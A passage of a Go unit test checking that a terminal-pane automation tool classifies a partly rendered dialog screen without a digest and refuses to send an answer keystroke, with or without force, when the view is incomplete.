	if err := json.Unmarshal(raw, &snap); err != nil || len(snap.Screen.Lines) == 0 || snap.Pane.State != ops.PaneStateDialog {
		t.Fatalf("the partial screen is not returned and classified: %s (%v)", raw, err)
	}
	if snap.Pane.DialogDigest != "" {
		t.Fatalf("an incomplete screen got a digest: %q", snap.Pane.DialogDigest)
	}
	for _, force := range []bool{false, true} {
		res, err := e.writeRaw(ops.OpAnswer, rawArgs("work", force, map[string]any{"choice": "1", "expect": exp}))
		if err != nil || res.Outcome != ops.OutcomeFailedNotSent || res.Reason != "view_incomplete" || res.Forceable || len(e.host.keys()) != 0 {
			t.Fatalf("force=%v: %+v keys=%v err=%v", force, res, e.host.keys(), err)
		}
	}
}
